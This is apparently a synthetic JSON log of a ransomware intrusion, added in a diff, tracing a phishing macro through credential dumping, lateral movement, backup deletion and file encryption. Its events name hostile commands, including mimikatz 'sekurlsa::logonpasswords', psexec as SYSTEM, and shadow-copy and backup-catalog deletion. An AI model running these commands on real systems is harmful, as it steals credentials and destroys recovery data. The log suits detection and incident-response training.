@@ -1,0 +1,84 @@
+[
+  {
+    "timestamp": "2026-08-25T08:00:00+00:00",
+    "host": "FIN-PC-07",
+    "user": "nguyen.van.a",
+    "src_ip": "203.0.113.45",
+    "event_id": "EVT001",
+    "log_source": "Email Gateway",
+    "event": "User received email with malicious attachment invoice_Q3.docm from external sender"
+  },
+  {
+    "timestamp": "2026-08-25T08:05:00+00:00",
+    "host": "FIN-PC-07",
+    "user": "nguyen.van.a",
+    "src_ip": "10.10.5.22",
+    "event_id": "EVT002",
+    "log_source": "Sysmon",
+    "event": "User opened invoice_Q3.docm and clicked 'Enable Content' to enable macro"
+  },
+  {
+    "timestamp": "2026-08-25T08:05:30+00:00",
+    "host": "FIN-PC-07",
+    "user": "nguyen.van.a",
+    "src_ip": "10.10.5.22",
+    "event_id": "EVT003",
+    "log_source": "Sysmon",
+    "event": "winword.exe spawned powershell.exe with command: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA..."
+  },
+  {
+    "timestamp": "2026-08-25T08:10:00+00:00",
+    "host": "FIN-PC-07",
+    "user": "nguyen.van.a",
+    "src_ip": "10.10.5.22",
+    "event_id": "EVT004",
+    "log_source": "EDR",
+    "event": "Process attempted lsass.exe dump via mimikatz sekurlsa::logonpasswords"
+  },
+  {
+    "timestamp": "2026-08-25T08:20:00+00:00",
+    "host": "FIN-PC-07",
+    "user": "nguyen.van.a",
+    "src_ip": "10.10.5.22",
+    "event_id": "EVT005",
+    "log_source": "Firewall",
+    "event": "Outbound HTTPS connection to 185.220.101.5 every 60 seconds, suspicious beaconing pattern, unusual user-agent"
+  },
+  {
+    "timestamp": "2026-08-25T08:35:00+00:00",
+    "host": "FIN-PC-07",
+    "user": "nguyen.van.a",
+    "src_ip": "10.10.5.22",
+    "event_id": "EVT006",
+    "log_source": "Windows Security Log",
+    "event": "net view \\\\FILE-SRV-02 executed followed by arp -a, remote system discovery on internal network"
+  },
+  {
+    "timestamp": "2026-08-25T08:50:00+00:00",
+    "host": "FIN-PC-07",
+    "user": "nguyen.van.a",
+    "src_ip": "10.10.5.22",
+    "dst_host": "FILE-SRV-02",
+    "event_id": "EVT007",
+    "log_source": "Sysmon",
+    "event": "psexec used to connect to \\\\FILE-SRV-02\\admin$ and execute remote command as SYSTEM"
+  },
+  {
+    "timestamp": "2026-08-25T09:00:00+00:00",
+    "host": "FILE-SRV-02",
+    "user": "SYSTEM",
+    "src_ip": "10.10.5.22",
+    "event_id": "EVT008",
+    "log_source": "Windows Security Log",
+    "event": "vssadmin delete shadows /all /quiet executed, wbadmin delete catalog -quiet executed"
+  },
+  {
+    "timestamp": "2026-08-25T09:05:00+00:00",
+    "host": "FILE-SRV-02",
+    "user": "SYSTEM",
+    "src_ip": "10.10.5.22",
+    "event_id": "EVT009",
+    "log_source": "File Integrity Monitoring",
+    "event": "Mass file rename detected: 4,821 files on \\\\FILE-SRV-02\\shared changed extension to .locked, ransom note README_TO_DECRYPT.txt created in every folder, files encrypted"
+  }
+]
